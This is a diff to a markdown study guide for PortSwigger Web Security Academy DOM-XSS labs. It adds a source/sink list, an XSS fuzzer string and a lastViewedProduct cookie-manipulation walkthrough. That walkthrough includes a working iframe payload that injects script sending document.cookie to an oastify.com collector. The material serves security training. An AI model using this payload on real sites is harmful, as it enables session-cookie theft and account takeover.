@@ -79,17 +79,26 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [DOM XSS AddEventListener Ads Message](#dom-xss-addeventlistener-ads-message)  
 [Reflected DOM Cookie Stealer](#dom-cookie-stealer)  
 
->DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. Review the code to ***identify*** the **sources** and **sinks** that may lead to exploit, list of examples:  
+### Identify DOM-XSS  
 
-* document.write
-* window.location
-* document.cookie
-* eval()
-* document.domain
-* WebSocket
-* element.src
-* postmessage
-* setRequestHeader
+>DOM-based XSS vulnerabilities arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes code to a sink that supports dynamic code execution. 
+>Test the following sequence of characters to identify XSS / DOM-XSS charters to use in escape: ```<>\'\"<script>{{7*7}}$(alert(1)}fuzzer``` fuzzer string.  
+
+>Review the code to ***identify*** the **sources** and **sinks** that may lead to exploit, list of samples:  
+
+* document.write()  
+* window.location  
+* document.cookie  
+* eval()  
+* document.domain  
+* WebSocket()  
+* element.src  
+* postMessage()  
+* setRequestHeader()  
+* FileReader.readAsText()  
+* ExecuteSql()  
+* sessionStorage.setItem()
+* document.evaluate()
 * JSON.parse
 * ng-app
 * URLSearchParams
@@ -265,6 +274,23 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 ![Reflected DOM-XSS json cookie stealer](images/reflected-dom-xss-json-cookie-stealer.png)  
 
 [PortSwigger Lab: Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)  
+
+### DOM-XSS LastviewedProduct Cookie  
+
+>Identify the cookie ```lastViewedProduct``` is set to the last URL visited under the product page. In the source code we identify the injection script tags where ```window.location``` is set.   
+
+![DOM-XSS lastViewedProduct cookie code](images/dom-xss-lastViewedProduct-cookie.png)  
+
+>Testing the escape out of of the script string for the value of **document.location** using ```/product?productId=1&'>fuzzer```. Note that **document.location** value cannot be URL encoded.  
+
+```html
+<iframe src="https://0a8f001a04b42ecdc063d67e0024004f.web-security-academy.net/product?productId=1&'><script>document.location=`http://i5oa9o285mz7gwkn8jxpwj61nstjh95y.oastify.com/?dc=`+document.cookie</script>" onload="if(!window.x)this.src='https://0a8f001a04b42ecdc063d67e0024004f.web-security-academy.net';window.x=1;">
+</iframe>
+```  
+
+>On exploit server host iframe ........
+
+[PortSwigger Lab: DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)  
   
 ## Cross Site Scripting  
 
